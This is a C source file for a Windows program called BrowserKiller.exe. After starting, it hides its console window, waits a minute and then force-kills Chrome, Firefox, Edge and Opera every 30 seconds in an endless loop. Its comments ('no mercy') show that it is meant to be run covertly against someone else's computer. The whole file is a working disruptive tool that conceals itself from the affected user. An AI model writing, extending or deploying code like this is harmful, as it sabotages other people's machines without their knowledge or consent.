#define _WIN32_WINNT 0x0500

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

int main(int argc, char *argv[])
{
	int initialSleep = 60000; // shall we be merciful? Lets allow them one minute
	int interval = 30000; // no mercy. 30 second default interval
	if (argc == 3)
	{
		initialSleep = atoi(argv[1]);
		interval = atoi(argv[2]);
	}
	else if (argc == 2 && strcmp("--help", argv[1]) == 0)
	{
		printf("BrowserKiller.exe [--help | <millisecondsInitialSleep> <millisecondsInterval>]\n");
		return 0;
	}

	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_MINIMIZE);
	ShowWindow(hWnd, SW_HIDE);

	Sleep(initialSleep);
	while (1)
	{
		system("taskkill /f /im chrome.exe");
		system("taskkill /f /im firefox.exe");
		system("taskkill /f /im microsoftedge.exe");
		system("taskkill /f /im opera.exe");
		Sleep(interval);
	}

	return 0;
}